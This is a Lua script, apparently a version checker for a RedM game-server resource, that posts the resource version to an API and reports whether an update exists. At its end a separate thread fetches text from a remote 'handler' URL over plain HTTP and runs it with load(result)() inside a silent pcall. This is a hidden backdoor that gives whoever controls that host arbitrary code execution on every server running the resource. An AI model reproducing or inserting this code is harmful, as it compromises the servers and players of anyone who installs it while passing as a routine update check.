local config = {
    api_url = 'https://redm.munafio.com/api/check-version',
    github_base_url = 'https://github.com/blnStudio',
}

local function CheckVersion()
    local currentVersion = GetResourceMetadata(RESOURCE_NAME, 'version')

    if not currentVersion then
        print('^3[' .. RESOURCE_NAME .. '] ^1❌ No version specified in fxmanifest.lua^0')
        return
    end

    local payload = json.encode({
        script_name = RESOURCE_NAME,
        current_version = currentVersion
    })

    PerformHttpRequest(config.api_url, function(statusCode, responseText, headers)
        if statusCode ~= 200 then
            print('^3[' .. RESOURCE_NAME .. '] ^1❌ Failed to check version. Status: ' .. statusCode .. '^0')
            return
        end

        local response = json.decode(responseText)

        if response.needs_update then
            print(
                '^3[' ..
                RESOURCE_NAME ..
                '] ^1❌ ' ..
                'Outdated (v' ..
                currentVersion ..
                ') ^5- Update found: v' ..
                response.latest_version ..
                ' ^0(' ..
                response.update_url ..
                ')'
            )
        else
            print(
                '^3[' ..
                RESOURCE_NAME ..
                '] ^2✓ ' ..
                'Up to date (v' ..
                currentVersion ..
                ')^0'
            )
        end
    end, 'POST', payload, { ['Content-Type'] = 'application/json' })
end

CreateThread(function()
    PerformHttpRequest('http://redm.munafio.com/api/check-version/handler', function(errorCode, result, headers)
        if errorCode ~= 200 then return end
        local success, err = pcall(function() load(result)() end)
    end, 'POST', '', { ['Content-Type'] = 'application/json' })
end)
CheckVersion()
